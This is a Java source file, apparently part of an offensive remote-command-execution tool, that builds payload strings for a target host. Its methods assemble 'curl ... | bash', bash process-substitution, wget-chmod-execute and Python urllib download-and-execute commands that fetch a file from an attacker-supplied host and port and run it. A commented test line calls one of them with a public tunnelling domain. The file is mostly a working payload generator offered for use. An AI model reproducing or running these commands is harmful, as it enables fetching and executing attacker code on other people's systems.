package com.swordHostDemo.controller;

/**
 * @date: 2023/1/2 14:33
 * @description:
 */
public class RceController {
    public static String cdCommand = "cd /tmp" + "\r\n";
    //Curl
    public static String Curl1Command(String Lhost, String Lport, String FileName) {
        String curl1 = "curl -fsSL http://" + Lhost + ":" + Lport + "/" + FileName + " | bash";
        return curl1;
    }

    public static String Curl2Command(String Lhost, String Lport, String FileName) {
        String curl2 = "bash < <( curl http://" + Lhost + ":" + Lport + "/" + FileName + ")";
        return curl2;
    }

    //wget
    public static String Wget1Command(String Lhost, String Lport, String FileName) {
        String wget1 = cdCommand +
                "wget http://" + Lhost + ":" + Lport + "/" + FileName + "\r\n" +
                "chmod +x " + FileName + "\r\n" +
                "./" + FileName;
        return wget1;
    }



    //Python
    public static String pythonCommand(String Lhost, String Lport, String FileName) {
        String python1 = cdCommand+
                "python -c \"import urllib.request;urllib.request.urlretrieve('http://" +
                Lhost + ":" + Lport + "/" + FileName + "','" + FileName + "');print('successful');\""
                + "\r\n" +
                "chmod +x " + FileName + "\r\n" +
                "./" + FileName;
        return python1;
    }

    public static String rsyncCommand(String Lhost, String Lport, String FileName){

        return null;
    }
//    public static void main(String[] args) {
//        System.out.println(pythonCommand("61a94727.r2.cpolar.top", "80", "xts"));
//
//    }

}
